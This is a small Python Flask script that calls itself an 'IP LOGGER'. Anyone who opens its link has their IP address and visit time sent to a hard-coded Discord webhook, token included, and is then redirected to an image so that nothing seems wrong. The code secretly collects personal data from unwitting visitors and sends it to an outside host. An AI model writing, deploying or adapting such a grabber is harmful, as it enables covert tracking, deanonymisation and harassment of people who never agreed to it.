from flask import Flask, request, redirect  # type: ignore[import-not-found]
from datetime import datetime
import requests   # type: ignore

app = Flask(__name__)


def send_ip(ip, date):
    webhook_url = "https://discord.com/api/webhooks/1538060698226270239/6uuCo3OPJBkJIuHhRIoVG0oZIv18gjKdnnSzXfBbGno-kP5QrB-pptH3sLb20bRvXEVS"
    data = {
        "content": "",
        "title": "IP LOGGER",
        "embeds": [{"title": ip, "description": date}],
    }
    requests.post(webhook_url, json=data, timeout=10)


@app.route("/")
def index():
    ip =request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")

    send_ip(ip, date)

    return redirect("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTK7b6GThaapcH90H9wpl-0bLoKZzxfFSm_kIWdx9bd_g&s=10")


if __name__ == "__main__":
    app.run(host='0.0.0.0')
